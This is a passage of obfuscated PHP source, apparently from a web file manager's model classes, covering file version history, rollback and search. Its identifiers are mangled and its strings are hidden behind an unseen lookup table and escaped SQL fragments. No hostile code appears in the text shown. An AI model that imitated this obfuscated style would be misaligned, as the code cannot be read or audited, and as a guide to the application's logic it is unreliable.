=> $ ²ùˆ„û); if ($GLOBALS[$µ¯ä¡[6]][$µ¯ä¡[102]][$µ¯ä¡[1313]] >= 1) { $this->historyAutoClear($ô½ô¾ù [$µ¯ä¡[203]]); $this->add($ô½ô¾ù ); } Hook::trigger($µ¯ä¡[2229], $ô½ô¾ù ); Model($µ¯ä¡[2230])->eventFileEdit($ş¡ÄøÛ[$µ¯ä¡[203]]); } private function historyAutoClear($—ˆ¨ŞÒ) { $÷‘¥ığ =& $_SERVER[÷ôÚîå]; $ÈÔàÀÌ¤ = Model($÷‘¥ığ[859])->get($÷‘¥ığ[1335]); $ñŠÚ¸­ = intval($GLOBALS[$÷‘¥ığ[6]][$÷‘¥ığ[102]][$÷‘¥ığ[1313]]); $Âü²÷¢ß = $ÈÔàÀÌ¤ == $÷‘¥ığ[1336] ? min(5, $ñŠÚ¸­) : $ñŠÚ¸­; $Âü²÷¢ß = $Âü²÷¢ß <= 0 ? 0 : $Âü²÷¢ß - 1; if ($Âü²÷¢ß >= 499) { return; } $—‘ÃšÓ… = array($÷‘¥ığ[500] => $—ˆ¨ŞÒ); $ŒşÖ´Ìü = $this->field($÷‘¥ığ[2231])->where($—‘ÃšÓ…)->order($÷‘¥ığ[2225])->select(); if (!$ŒşÖ´Ìü || $Âü²÷¢ß >= count($ŒşÖ´Ìü)) { return; } $‘¦òú = array_to_keyvalue($ŒşÖ´Ìü, $÷‘¥ığ[12], $÷‘¥ığ[484]); $‘¦òú = array_slice($‘¦òú, $Âü²÷¢ß); $Õ«…±‹ˆ = array_to_keyvalue($ŒşÖ´Ìü, $÷‘¥ığ[12], $÷‘¥ığ[550]); $Õ«…±‹ˆ = array_slice($Õ«…±‹ˆ, $Âü²÷¢ß); if (!$‘¦òú || !$Õ«…±‹ˆ) { return; } $—‘ÃšÓ… = array($÷‘¥ığ[502] => array($÷‘¥ığ[7], $‘¦òú)); $this->where($—‘ÃšÓ…)->delete(); Model($÷‘¥ığ[553])->remove($Õ«…±‹ˆ); } public function listData($´Ë•‰°ê) { $•„Í‚¦ =& $_SERVER[÷ôÚîå]; $õõÔ¦šâ = array($•„Í‚¦[500] => $´Ë•‰°ê); $¾ø‡ë­ = $•„Í‚¦[2232]; $¶›©î×® = $this->field($¾ø‡ë­)->where($õõÔ¦šâ)->order($•„Í‚¦[2225])->selectPage(); $this->_listAppendUser($¶›©î×®[$•„Í‚¦[454]]); $–ÏéÁ¬— = Model($•„Í‚¦[859])->get($•„Í‚¦[1335]); $™‹î°·Ö = 5; if ($–ÏéÁ¬— == $•„Í‚¦[1336]) { $¶›©î×®[$•„Í‚¦[454]] = array_slice($¶›©î×®[$•„Í‚¦[454]], 0, $™‹î°·Ö); $¶›©î×®[$•„Í‚¦[451]] = array($•„Í‚¦[2233] => 1, $•„Í‚¦[2234] => 20, $•„Í‚¦[2235] => 1, $•„Í‚¦[2236] => count($¶›©î×®[$•„Í‚¦[454]])); } return $¶›©î×®; } protected function _listAppendUser(&$Ã®ûö«) { $¾Šä·³Î =& $_SERVER[÷ôÚîå]; $¥şÄÂ›• = array_to_keyvalue($Ã®ûö«, $¾Šä·³Î[12], $¾Šä·³Î[1779]); $ÈìµÇŠ = Model($¾Šä·³Î[607])->userListInfo($¥şÄÂ›•); foreach ($Ã®ûö« as &$ŸÁôâ·Š) { $‹Ø–·òÃ = $ŸÁôâ·Š[$¾Šä·³Î[1779]]; $ŸÁôâ·Š[$¾Šä·³Î[536]] = $ÈìµÇŠ[$‹Ø–·òÃ] ? $ÈìµÇŠ[$‹Ø–·òÃ] : !1; } unset($ŸÁôâ·Š); } public function fileInfo($×èÉ±²) { $ô¾Ş‚…Ø =& $_SERVER[÷ôÚîå]; $˜í©©Ó = $this->tablePrefix; $¹±ãğª¾ = "{$˜í©©Ó}\151\x6f\x5f\x66\x69\x6c\x65\40\146\151\154\x65\163\40\x6f\x6e\x20\146\x69\x6c\145\163\x2e\x66\151\154\x65\x49\104\x20\75\40\150\x69\x73\x74\x6f\x72\x79\x2e\146\x69\x6c\145\x49\104"; return $this->alias($ô¾Ş‚…Ø[2237])->where(array($ô¾Ş‚…Ø[502] => $×èÉ±²))->join($¹±ãğª¾, $ô¾Ş‚…Ø[2238])->find(); } public function removeItem($»ÙÛ§²) { $İÖÉé÷ƒ =& $_SERVER[÷ôÚîå]; $Ãõğç¤ = array($İÖÉé÷ƒ[502] => $»ÙÛ§²); $ÇÒ™¬ = $this->where($Ãõğç¤)->find(); if ($ÇÒ™¬) { $«ÑŒé‰Ÿ = $this->where($Ãõğç¤)->delete(); Model($İÖÉé÷ƒ[553])->remove($ÇÒ™¬[$İÖÉé÷ƒ[550]]); return $«ÑŒé‰Ÿ; } return !1; } public function removeBySource($™´îÕ‘æ) { $•ĞÕŞÈ¢ =& $_SERVER[÷ôÚîå]; if (!$™´îÕ‘æ) { return !1; } if (!is_array($™´îÕ‘æ)) { $™´îÕ‘æ = array($™´îÕ‘æ); } $Ãû¤Ş¹ı = array($•ĞÕŞÈ¢[500] => array($•ĞÕŞÈ¢[7], $™´îÕ‘æ)); $ÅÏ×ÑÔô = $this->field($•ĞÕŞÈ¢[551])->where($Ãû¤Ş¹ı)->select(); if ($ÅÏ×ÑÔô) { $this->where($Ãû¤Ş¹ı)->delete(); $ªâ›üÇÒ = array_to_keyvalue($ÅÏ×ÑÔô, $•ĞÕŞÈ¢[12], $•ĞÕŞÈ¢[550]); Model($•ĞÕŞÈ¢[553])->remove($ªâ›üÇÒ); } return !0; } public function setDetail($×‘‰Ç—·, $“ÌÙğ´) { $šÍæÃÉ =& $_SERVER[÷ôÚîå]; return $this->where(array($šÍæÃÉ[502] => $×‘‰Ç—·))->save(array($šÍæÃÉ[2228] => $“ÌÙğ´)); } public function rollbackToItem($±¦¨ıÂ, $™ãÈ‚ß) { $È»øâĞ =& $_SERVER[÷ôÚîå]; $¯ş¡€Üß = Model($È»øâĞ[914])->sourceInfo($±¦¨ıÂ); $this->addHistory($¯ş¡€Üß, LNG($È»øâĞ[2239])); $Æú­Àò… = $this->find($™ãÈ‚ß); $²§¤±”ù = array($È»øâĞ[550] => $Æú­Àò…[$È»øâĞ[550]], $È»øâĞ[89] => $Æú­Àò…[$È»øâĞ[89]], $È»øâĞ[98] => time(), $È»øâĞ[538] => USER_ID); Model($È»øâĞ[914])->where(array($È»øâĞ[203] => $±¦¨ıÂ))->save($²§¤±”ù); return $this->where(array($È»øâĞ[502] => $™ãÈ‚ß))->delete(); } public function clearSame($‹³®°) { $É½ŞÏŒ =& $_SERVER[÷ôÚîå]; $€ÏŞÓşÂ = $this->listData($‹³®°); $‚È–’Š = array_to_keyvalue_group($€ÏŞÓşÂ, $É½ŞÏŒ[550]); $ø÷¿îŒ = array(); $ƒŒ¡ØºÛ = array(); foreach ($‚È–’Š as $ÒïîÈ•„) { if (!$ÒïîÈ•„ || count($ÒïîÈ•„) <= 1) { continue; } foreach ($ÒïîÈ•„ as $ ®•í‰Û) { $ø÷¿îŒ[] = $ ®•í‰Û[$É½ŞÏŒ[550]]; $ƒŒ¡ØºÛ[] = $ ®•í‰Û[$É½ŞÏŒ[484]]; } } if (!$ƒŒ¡ØºÛ) { return; } $this->where(array($É½ŞÏŒ[484] => array($É½ŞÏŒ[7], $ƒŒ¡ØºÛ)))->delete(); Model($É½ŞÏŒ[553])->remove($ø÷¿îŒ); } public function userSpace() { $¡ƒªÎõÕ =& $_SERVER[÷ôÚîå]; $á—†áºš = $this->tablePrefix; $¾²Œö²ø = array($¡ƒªÎõÕ[1770] => USER_ID); $­°Ğ®‘ã = "{$á—†áºš}\x69\157\137\x66\151\x6c\x65\40\146\x69\154\145\163\x20\x6f\x6e\x20\146\151\154\145\163\56\146\151\x6c\145\111\x44\40\x3d\40\150\151\x73\164\x6f\162\171\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($¡ƒªÎõÕ[2237])->where($¾²Œö²ø)->join($­°Ğ®‘ã, $¡ƒªÎõÕ[2238])->sum($¡ƒªÎõÕ[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($²•—Ëõ) { $–êÅ ÎÀ =& $_SERVER[÷ôÚîå]; $²ŒÕÁÄÖ = KodIO::fileTypeList(); $çšá‘•Ğ = $²ŒÕÁÄÖ[$²•—Ëõ]; if (!$çšá‘•Ğ) { return array(); } $ËÒ°±×‚ = $çšá‘•Ğ[$–êÅ ÎÀ[179]]; $à¦ô±†¸ = $–êÅ ÎÀ[7]; if (!$çšá‘•Ğ[$–êÅ ÎÀ[179]]) { $€°ªÑøĞ = array_to_keyvalue($²ŒÕÁÄÖ, $–êÅ ÎÀ[12], $–êÅ ÎÀ[179]); $ËÒ°±×‚ = implode($–êÅ ÎÀ[50], $€°ªÑøĞ); $à¦ô±†¸ = $–êÅ ÎÀ[2240]; } $¦»²Íé‡ = explode($–êÅ ÎÀ[50], trim($ËÒ°±×‚, $–êÅ ÎÀ[50])); return array($à¦ô±†¸, $¦»²Íé‡); } public function listPathType($ù—Ã€±á) { $ôÖ¼³¾« =& $_SERVER[÷ôÚîå]; $Áßùç°Ì = $this->fileTypeWhere($ù—Ã€±á); if (!$Áßùç°Ì) { return array(); } $˜îğâØ« = USER_ID; $Ë«ıÓŠ› = Model($ôÖ¼³¾«[607])->getInfo($˜îğâØ«); $ì§¢Ú¯ = array($ôÖ¼³¾«[657] => SourceModel::TYPE_USER, $ôÖ¼³¾«[593] => array($ôÖ¼³¾«[621], $ôÖ¼³¾«[603] . $Ë«ıÓŠ›[$ôÖ¼³¾«[100]][$ôÖ¼³¾«[203]] . $ôÖ¼³¾«[622]), $ôÖ¼³¾«[658] => $˜îğâØ«, $ôÖ¼³¾«[655] => 0, $ôÖ¼³¾«[656] => $Áßùç°Ì); return $this->listSource($ì§¢Ú¯); } public function listSearch($åŒşŒœ, $ÃÙæû¾ò = 300) { $ÅÜŒô¢³ =& $_SERVER[÷ôÚîå]; if (isset($åŒşŒœ[$ÅÜŒô¢³[2076]]) && $åŒşŒœ[$ÅÜŒô¢³[2076]]) { $åŒşŒœ[$ÅÜŒô¢³[2076]] = str_replace($ÅÜŒô¢³[469], $ÅÜŒô¢³[2241], trim($åŒşŒœ[$ÅÜŒô¢³[2076]])); } $îß€ìÆ± = $this->_parseSearchWhere($åŒşŒœ); if (!isset($îß€ìÆ±[$ÅÜŒô¢³[514]])) { $îß€ìÆ±[$ÅÜŒô¢³[514]] = 0; } $®õ¤ûˆÄ = $ÅÜŒô¢³[2242]; $»‚ì¯ÑÚ = $îß€ìÆ±; $Ç™šš°¯ = $®õ¤ûˆÄ; $this->_listSearchBindPinyin($åŒşŒœ, $îß€ìÆ±, $®õ¤ûˆÄ); $this->alias($ÅÜŒô¢³[528])->_makeOrder(); $îß€ìÆ± = $this->parseWhereLike($îß€ìÆ±); $¬õÄÖ‹Ø = $this->distinct(!0)->field($®õ¤ûˆÄ)->where($îß€ìÆ±)->selectPage($ÃÙæû¾ò); if ($GLOBALS[$ÅÜŒô¢³[6]][$ÅÜŒô¢³[466]][$ÅÜŒô¢³[467]] && Input::check($åŒşŒœ[$ÅÜŒô¢³[2076]], $ÅÜŒô¢³[664]) && $¬õÄÖ‹Ø[$ÅÜŒô¢³[451]][$ÅÜŒô¢³[438]] == 1 && $¬õÄÖ‹Ø[$ÅÜŒô¢³[451]][$ÅÜŒô¢³[452]] == 0) { $¬õÄÖ‹Ø = $this->distinct(!0)->field($®õ¤ûˆÄ)->where($»‚ì¯ÑÚ)->limit(1000)->select(); $¬õÄÖ‹Ø = array_page_split($¬õÄÖ‹Ø, !1, $ÃÙæû¾ò); } $this->_listSearchFileContent($¬õÄÖ‹Ø, $åŒşŒœ, $Ç™šš°¯, $»‚ì¯ÑÚ); $this->_listSearchDesc($¬õÄÖ‹Ø, $åŒşŒœ, $Ç™šš°¯); $this->_listSearchTag($¬õÄÖ‹Ø, $åŒşŒœ, $Ç™šš°¯); $this->_listSearchGroupTag($¬õÄÖ‹Ø, $åŒşŒœ, $Ç™šš°¯); $this->_listDataApply($¬õÄÖ‹Ø[$ÅÜŒô¢³[454]]); $this->_listMake($¬õÄÖ‹Ø); return $¬õÄÖ‹Ø; } private function _listSearchFileContent(&$ó£—ššÕ, $ˆ¶›¦Õ, $áº„¿·³, $³ğ¨°±ª) { $—»â®ˆ¢ =& $_SERVER[÷ôÚîå]; if (!$ˆ¶›¦Õ[$—»â®ˆ¢[2076]] || $ó£—ššÕ[$—»â®ˆ¢[451]][$—»â®ˆ¢[438]] > 1) { return; } if (!isset($³ğ¨°±ª[$—»â®ˆ¢[32]]) || !is_array($ˆ¶›¦Õ[$—»â®ˆ¢[550]])) { return; } $³ğ¨°±ª[$—»â®ˆ¢[550]] = array($—»â®ˆ¢[7], $ˆ¶›¦Õ[$—»â®ˆ¢[550]]); unset($³ğ¨°±ª[$—»â®ˆ¢[32]]); unset($ˆ¶›¦Õ[$—»â®ˆ¢[550]]); $¢÷Ğœ˜ = $this->field($áº„¿·³)->where($³ğ¨°±ª)->limit($—»â®ˆ¢[2243])->select(); if (!$¢÷Ğœ˜ || count($¢÷Ğœ˜) == 0) { return; } $ó£—ššÕ[$—»â®ˆ¢[454]] = array_merge($¢÷Ğœ˜, $ó£—ššÕ[$—»â®ˆ¢[454]]); $ó£—ššÕ[$—»â®ˆ¢[451]][$—»â®ˆ¢[452]] += count($¢÷Ğœ˜); } private function _listSearchTag(&$ì®¾Ä, $—ğ‡ÒÄ, $Ã±¶§¥ª) { $ºıÂôû¯ =& $_SERVER[÷ôÚîå]; if (!$—ğ‡ÒÄ[$ºıÂôû¯[2076]] || $ì®¾Ä[$ºıÂôû¯[451]][$ºıÂôû¯[438]] > 1) { return; } $İŒêÍË = Model($ºıÂôû¯[2244])->listData(); $„°ôÆÛ¯ = array(); $ÄÕä£Îô = $—ğ‡ÒÄ[$ºıÂôû¯[2076]]; foreach ($İŒêÍË as $ÇÕºøô) { $”ªÁ¦ƒŒ = $ÇÕºøô[$ºıÂôû¯[32]]; $°öì–Ç = str_replace($ºıÂôû¯[53], $ºıÂôû¯[12], Pinyin::get($”ªÁ¦ƒŒ)); if (stripos($”ªÁ¦ƒŒ, $ÄÕä£Îô) !== !1 || stripos($°öì–Ç, $ÄÕä£Îô) !== !1) { $„°ôÆÛ¯[] = $ÇÕºøô[$ºıÂôû¯[484]]; } } if (!$„°ôÆÛ¯) { return; } $Ş‡µÇ‚ = array($ºıÂôû¯[509] => array($ºıÂôû¯[7], $„°ôÆÛ¯), $ºıÂôû¯[1779] => USER_ID); $İÆÎ¿éË = Model($ºıÂôû¯[511])->field($ºıÂôû¯[97])->where($Ş‡µÇ‚)->select(); $İÆÎ¿éË = array_to_keyvalue($İÆÎ¿éË, $ºıÂôû¯[12], $ºıÂôû¯[97]); $·¬¿ƒî¡ = array_unique($İÆÎ¿éË); $this->_listSearchMerge($ì®¾Ä, $—ğ‡ÒÄ, $Ã±¶§¥ª, $·¬¿ƒî¡); } private function _listSearchDesc(&$…ß­îâ, $ĞÊè…š–, $šªğƒµ) { $Ïß”«ôÎ =& $_SERVER[÷ôÚîå]; if (!$ĞÊè…š–[$Ïß”«ôÎ[2076]] || $…ß­îâ[$Ïß”«ôÎ[451]][$Ïß”«ôÎ[438]] > 1) { return; } $Èô—ÆŒ¼ = array($Ïß”«ôÎ[107] => $Ïß”«ôÎ[535], $Ïß”«ôÎ[459] => array($Ïß”«ôÎ[468], $Ïß”«ôÎ[2078] . $ĞÊè…š–[$Ïß”«ôÎ[2076]] . $Ïß”«ôÎ[2078])); $‚‡§Ÿ¸Ö = !1; if ($‚‡§Ÿ¸Ö) { $Ì¸øû™¾ = $this->listSearchChildren($ĞÊè…š–[$Ïß”«ôÎ[202]]); $Ì¸øû™¾ = array_unique($Ì¸øû™¾); if (!$Ì¸øû™¾) { return; } $Èô—ÆŒ¼[$Ïß”«ôÎ[203]] = array($Ïß”«ôÎ[7], $Ì¸øû™¾); } $²€£ÁÔ’ = Model($Ïß”«ôÎ[641])->field($Ïß”«ôÎ[203])->where($Èô—ÆŒ¼)->limit(5000)->select(); $ÉÇûÈ™š = array_to_keyvalue($²€£ÁÔ’, $Ïß”«ôÎ[12], $Ïß”«ôÎ[203]); $this->_listSearchMerge($…ß­îâ, $ĞÊè…š–, $šªğƒµ, $ÉÇûÈ™š); } private function _listSearchGroupTag(&$÷‡ ŞºÎ, $¯“ÇÔøô, $û‰Ê×µõ) { $Èû÷·½À =& $_SERVER[÷ôÚîå]; if (!$¯“ÇÔøô[$Èû÷·½À[2076]] || $÷‡ ŞºÎ[$Èû÷·½À[451]][$Èû÷·½À[438]] > 1 || !$¯“ÇÔøô[$Èû÷·½À[202]]) { return; } $ŒÀØÉµ¿ = $this->sourceInfo($¯“ÇÔøô[$Èû÷·½À[202]]); if (!$ŒÀØÉµ¿ || $ŒÀØÉµ¿[$Èû÷·½À[200]] != SourceModel::TYPE_GROUP) { return; } $œ™ô¥˜ó = $ŒÀØÉµ¿[$Èû÷·½À[578]]; $ËÔºÛÁ = Model($Èû÷·½À[2245])->get($œ™ô¥˜ó); $ª•­Ö© = array(); $ÑÙ—ŸÆĞ = $¯“ÇÔøô[$Èû÷·½À[2076]]; foreach ($ËÔºÛÁ[$Èû÷·½À[454]] as $¥õÙ¡ª£) { $Û‰®À† = $¥õÙ¡ª£[$Èû÷·½À[32]]; $Â‚İáˆ = str_replace($Èû÷·½À[53], $Èû÷·½À[12], Pinyin::get($Û‰®À†)); if (stripos($Û‰®À†, $ÑÙ—ŸÆĞ) !== !1 || stripos($Â‚İáˆ, $ÑÙ—ŸÆĞ) !== !1) { $ª•­Ö©[] = $¥õÙ¡ª£[$Èû÷·½À[484]]; } } if (!$ª•­Ö©) { return; } $Ú„¦ÍÇÁ = array($Èû÷·½À[509] => array($Èû÷·½À[7], $ª•­Ö©), $Èû÷·½À[1779] => 0, $Èû÷·½À[33] => $Èû÷·½À[2098] . $œ™ô¥˜ó); $éä©ù©ˆ = Model($Èû÷·½À[511])->field($Èû÷·½À[97])->where($Ú„¦ÍÇÁ)->select(); $éä©ù©ˆ = array_to_keyvalue($éä©ù©ˆ, $Èû÷·½À[12], $Èû÷·½À[97]); $¯Ôá¤ºç = array_unique($éä©ù©ˆ); $this->_listSearchMerge($÷‡ ŞºÎ, $¯“ÇÔøô, $û‰Ê×µõ, $¯Ôá¤ºç); } private function _listSearchMerge(&$½ªïĞ¬¡, $“¥°ø‹, $Ÿ™û¾Œ, $‰‡ÇÖÂà) { $¬æĞÆçè =& $_SERVER[÷ôÚîå]; if (!$‰‡ÇÖÂà) { return; } $ô¦­şÁĞ = array_to_keyvalue($½ªïĞ¬¡[$¬æĞÆçè[454]], $¬æĞÆçè[12], $¬æĞÆçè[203]); $¼Â×€Å¾ = array_diff($‰‡ÇÖÂà, $ô¦­şÁĞ); if (!$¼Â×€Å¾) { return; } $–¦½íöâ = array($¬æĞÆçè[203] => array($¬æĞÆçè[7], $¼Â×€Å¾)); $é±¿ÓÕÀ = $this->field($Ÿ™û¾Œ)->where($–¦½íöâ)->select(); if (!$é±¿ÓÕÀ) { return; } $Ì©…ÍÕ = array(); foreach ($é±¿ÓÕÀ as $…úŞŒŸ) { if ($this->_listSearchFilter($…úŞŒŸ, $“¥°ø‹)) { $Ì©…ÍÕ[] = $…úŞŒŸ; } } $½ªïĞ¬¡[$¬æĞÆçè[454]] = array_merge($Ì©…ÍÕ, $½ªïĞ¬¡[$¬æĞÆçè[454]]); $½ªïĞ¬¡[$¬æĞÆçè[451]][$¬æĞÆçè[452]] += count($Ì©…ÍÕ); } private function _listSearchFilter($€öûà, $¡¡º¯îœ) { $ğĞ½„¥¡ =& $_SERVER[÷ôÚîå]; $ä¾±‡¼Ü = $€öûà[$ğĞ½„¥¡[494]] == $ğĞ½„¥¡[101]; if (!strstr($€öûà[$ğĞ½„¥¡[593]], $ğĞ½„¥¡[50] . $¡¡º¯îœ[$ğĞ½„¥¡[202]] . $ğĞ½„¥¡[50])) { return !1; } if (isset($¡¡º¯îœ[$ğĞ½„¥¡[495]]) && $¡¡º¯îœ[$ğĞ½„¥¡[495]] != $ğĞ½„¥¡[865]) { if ($¡¡º¯îœ[$ğĞ½„¥¡[495]] == $ğĞ½„¥¡[88] && !$ä¾±‡¼Ü) { return !1; } if ($¡¡º¯îœ[$ğĞ½„¥¡[495]] != $ğĞ½„¥¡[88] && $ä¾±‡¼Ü) { return !1; } if (!strstr($€öûà[$ğĞ½„¥¡[179]], $ğĞ½„¥¡[50] . $¡¡º¯îœ[$ğĞ½„¥¡[495]] . $ğĞ½„¥¡[50])) { return !1; } } if (isset($¡¡º¯îœ[$ğĞ½„¥¡[2246]]) && $¡¡º¯îœ[$ğĞ½„¥¡[2246]] < $€öûà[$ğĞ½„¥¡[89]]) { return !1; } if (isset($¡¡º¯îœ[$ğĞ½„¥¡[2247]]) && $¡¡º¯îœ[$ğĞ½„¥¡[2247]] > $€öûà[$ğĞ½„¥¡[89]]) { return !1; } if (isset($¡¡º¯îœ[$ğĞ½„¥¡[671]]) && $¡¡º¯îœ[$ğĞ½„¥¡[671]] != $€öûà[$ğĞ½„¥¡[538]]) { return !1; } return !0; } public function listSearchChildren($ÀÏ±Æ—º, $èÔ˜•å¸ = 5000) { $®í½Ğ·Ş =& $_SERVER[÷ôÚîå]; $¢Ê—ªÀ = array(); $ô‘á¯›Å = $this->sourceInfo($ÀÏ±Æ—º); $Õ©„àÎ¹ = array($®í½Ğ·Ş[593] => array($®í½Ğ·Ş[468], $ô‘á¯›Å[$®í½Ğ·Ş[593]] . $ô‘á¯›Å[$®í½Ğ·Ş[203]] . $®í½Ğ·Ş[622])); $¾î¡¯é = $this->field($®í½Ğ·Ş[89])->where($Õ©„àÎ¹)->limit($èÔ˜•å¸ + 1)->select(); $¦ÙÁŞôŒ = is_array($¾î¡¯é) ? count($¾î¡¯é) : 0; if ($¦ÙÁŞôŒ > $èÔ˜•å¸) { return $this->_listSearchChildrenNear($ÀÏ±Æ—º, $èÔ˜•å¸); } $‘ˆ Î½ = $this->field($®í½Ğ·Ş[203])->where($Õ©„àÎ¹)->select(); $¢Ê—ªÀ = array_to_keyvalue($‘ˆ Î½, $®í½Ğ·Ş[12], $®í½Ğ·Ş[203]); return $¢Ê—ªÀ; } private function _listSearchChildrenNear($ˆ×õÈÃÚ, $¡‘”óıµ) { $è¨»¿Ü =& $_SERVER[÷ôÚîå]; $çë£æ¨ş = array(); $±Å¢¦ = array($è¨»¿Ü[202] => $ˆ×õÈÃÚ); $¾†ï¾ë² = $this->field($è¨»¿Ü[2248])->where($±Å¢¦)->select(); $Ë‰ÉƒØ° = array_to_keyvalue(array_filter_by_field($¾†ï¾ë², $è¨»¿Ü[494], $è¨»¿Ü[101]), $è¨»¿Ü[12], $è¨»¿Ü[203]); $çë£æ¨ş = array_merge($çë£æ¨ş, array_to_keyvalue($¾†ï¾ë², $è¨»¿Ü[12], $è¨»¿Ü[203])); if (!$Ë‰ÉƒØ°) { return $çë£æ¨ş; } $±Å¢¦ = array($è¨»¿Ü[202] => array($è¨»¿Ü[7], $Ë‰ÉƒØ°)); $¾†ï¾ë² = $this->field($è¨»¿Ü[2248])->where($±Å¢¦)->limit($¡‘”óıµ)->select(); $çë£æ¨ş = array_merge($çë£æ¨ş, array_to_keyvalue($¾†ï¾ë², $è¨»¿Ü[12], $è¨»¿Ü[203])); $çë£æ¨ş = array_slice($çë£æ¨ş, 0, intval($¡‘”óıµ)); return $çë£æ¨ş; } private function _listSearchBindPinyin($¹Å¥Ë, &$‰¾ûÁ¼•, &$ÍÅ“¥‰Ï) { $ˆ£ÖÅİÙ =& $_SERVER[÷ôÚîå]; if (!isset($¹Å¥Ë[$ˆ£ÖÅİÙ[2076]]) || !$¹Å¥Ë[$ˆ£ÖÅİÙ[2076]]) { return; } if (!Input::check($¹Å¥Ë[$ˆ£ÖÅİÙ[2076]], $ˆ£ÖÅİÙ[403]) || strlen($¹Å¥Ë[$ˆ£ÖÅİÙ[2076]]) < 2) { return; } $õ‹“ç– = "\114\x45\106\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\137\163\157\165\x72\x63\145\x5f\155\x65\164\x61\40\155\145\164\x61\x20\x6f\x6e\x20\163\x6f\165\x72\x63\145\56\163\157\165\162\x63\x65\x49\104\40\75\40\155\145\164\x61\56\x73\x6f\x75\162\x63\x65\111\x44"; $±„”«¦² = array(); $ÍÅ“¥‰Ï = str_replace(array($ˆ£ÖÅİÙ[65], $ˆ£ÖÅİÙ[53], $ˆ£ÖÅİÙ[2249]), $ˆ£ÖÅİÙ[12], $ÍÅ“¥‰Ï); $ÍÅ“¥‰Ï = $ˆ£ÖÅİÙ[520] . str_replace($ˆ£ÖÅİÙ[50], $ˆ£ÖÅİÙ[521], $ÍÅ“¥‰Ï); $†äÜï = $‰¾ûÁ¼•[$ˆ£ÖÅİÙ[32]]; unset($‰¾ûÁ¼•[$ˆ£ÖÅİÙ[32]]); foreach ($‰¾ûÁ¼• as $¿°¨ìŠ· => $É¸½¬Ò) { $±„”«¦²[$ˆ£ÖÅİÙ[520] . $¿°¨ìŠ·] = $É¸½¬Ò; } foreach ($†äÜï as $İº›¼Âš) { $±„”«¦²[] = array($ˆ£ÖÅİÙ[525] => $İº›¼Âš, $ˆ£ÖÅİÙ[1089] => $ˆ£ÖÅİÙ[2080], array($ˆ£ÖÅİÙ[2250] => $İº›¼Âš, $ˆ£ÖÅİÙ[2251] => array($ˆ£ÖÅİÙ[7], array($ˆ£ÖÅİÙ[547], $ˆ£ÖÅİÙ[546])))); } $this->join($õ‹“ç–); $‰¾ûÁ¼• = $±„”«¦²; } private function _parseSearchWhere($Š÷‰®¾¶) { $¤­»„‡á =& $_SERVER[÷ôÚîå]; $‹×ƒ»Šş = array(); if (isset($Š÷‰®¾¶[$¤­»„‡á[849]]) && $Š÷‰®¾¶[$¤­»„‡á[849]]) { $‹×ƒ»Šş[$¤­»„‡á[98]] = array($¤­»„‡á[2252], $Š÷‰®¾¶[$¤­»„‡á[849]]); } if (isset($Š÷‰®¾¶[$¤­»„‡á[850]]) && $Š÷‰®¾¶[$¤­»„‡á[850]]) { $™¬ä´Û = array($¤­»„‡á[2253], $Š÷‰®¾¶[$¤­»„‡á[850]]); if ($‹×ƒ»Šş[$¤­»„‡á[98]]) { $‹×ƒ»Šş[$¤­»„‡á[98]] = array($‹×ƒ»Šş[$¤­»„‡á[98]], $™¬ä´Û, $¤­»„‡á[2254]); } else { $‹×ƒ»Šş[$¤­»„‡á[98]] = $™¬ä´Û; } } if (isset($Š÷‰®¾¶[$¤­»„‡á[2246]]) && $Š÷‰®¾¶[$¤­»„‡á[2246]] > 0) { $‹×ƒ»Šş[$¤­»„‡á[89]] = array($¤­»„‡á[2252], $Š÷‰®¾¶[$¤­»„‡á[2246]]); } if (isset($Š÷‰®¾¶[$¤­»„‡á[2247]]) && $Š÷‰®¾¶[$¤­»„‡á[2247]]) { $™¬ä´Û = array($¤­»„‡á[2253], $Š÷‰®¾¶[$¤­»„‡á[2247]]); if ($‹×ƒ»Šş[$¤­»„‡á[89]]) { $‹×ƒ»Šş[$¤­»„‡á[89]] = array($‹×ƒ»Šş[$¤­»„‡á[89]], $™¬ä´Û, $¤­»„‡á[2254]); } else { $‹×ƒ»Šş[$¤­»„‡á[89]] = $™¬ä´Û; } } if (isset($Š÷‰®¾¶[$¤­»„‡á[671]]) && $Š÷‰®¾¶[$¤­»„‡á[671]]) { $‹×ƒ»Šş[] = array($¤­»„‡á[538] => $Š÷‰®¾¶[$¤­»„‡á[671]], $¤­»„‡á[536] => $Š÷‰®¾¶[$¤­»„‡á[671]], $¤­»„‡á[1089] => $¤­»„‡á[2080]); } if (isset($Š÷‰®¾¶[$¤­»„‡á[495]]) && $Š÷‰®¾¶[$¤­»„‡á[495]]) { $­°Áéå = $Š÷‰®¾¶[$¤­»„‡á[495]]; if ($­°Áéå == $¤­»„‡á[88]) { $‹×ƒ»Šş[$¤­»„‡á[494]] = 1; } else { if ($­°Áéå == $¤­»„‡á[2255]) { $‹×ƒ»Šş[$¤­»„‡á[494]] = 0; } else { if ($­°Áéå) { $­°Áéå = is_array($­°Áéå) ? $­°Áéå : explode($¤­»„‡á[50], $­°Áéå); $‹×ƒ»Šş[$¤­»„‡á[495]] = array($¤­»„‡á[501], $­°Áéå); $‹×ƒ»Šş[$¤­»„‡á[494]] = 0; } } } } $this->_parseSearchParent($Š÷‰®¾¶, $‹×ƒ»Šş); if (isset($Š÷‰®¾¶[$¤­»„‡á[2076]]) && trim($Š÷‰®¾¶[$¤­»„‡á[2076]])) { $•ıÌü‰ = trim($Š÷‰®¾¶[$¤­»„‡á[2076]]); $şĞğù· = explode($¤­»„‡á[53], $•ıÌü‰); if (strlen($•ıÌü‰) > 2 && (substr($•ıÌü‰, 0, 1) == $¤­»„‡á[131] && substr($•ıÌü‰, -1) == $¤­»„‡á[131]) || substr($•ıÌü‰, 0, 1) == $¤­»„‡á[58] && substr($•ıÌü‰, -1) == $¤­»„‡á[58]) { $•ıÌü‰ = substr($•ıÌü‰, 1, -1); $şĞğù· = array($•ıÌü‰); } $‹×ƒ»Šş[$¤­»„‡á[32]] = array(array($¤­»„‡á[621], $¤­»„‡á[2078] . $•ıÌü‰ . $¤­»„‡á[2078])); if (count($şĞğù·) > 1) { $‹×ƒ»Šş[$¤­»„‡á[32]] = array(); foreach ($şĞğù· as $ÍÔåÍÃ·) { if (!trim($ÍÔåÍÃ·)) { continue; } $‹×ƒ»Šş[$¤­»„‡á[32]][] = array($¤­»„‡á[621], $¤­»„‡á[2078] . trim($ÍÔåÍÃ·) . $¤­»„‡á[2078]); } } } return 